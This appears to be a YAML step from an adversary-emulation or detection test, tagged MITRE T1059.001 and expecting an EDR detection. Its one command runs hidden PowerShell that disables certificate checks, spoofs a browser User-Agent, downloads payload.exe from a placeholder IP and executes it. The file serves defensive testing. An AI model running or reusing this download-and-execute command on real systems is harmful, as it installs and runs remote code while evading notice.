steps:
- id: step-01
  name: Start PowerShell with Hidden Window
  command: powershell.exe -WindowStyle Hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback
    = {$true}; $client = New-Object System.Net.WebClient; $client.Headers.Add('User-Agent', 'Mozilla/5.0
    (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    $client.Headers.Add('Accept', '*/*'); $client.DownloadFile('http://192.0.2.10/payload.exe', 'C:\Users\Public\payload.exe');
    Start-Process -FilePath 'C:\Users\Public\payload.exe'"
  identity: direct
  mitre_technique: T1059.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
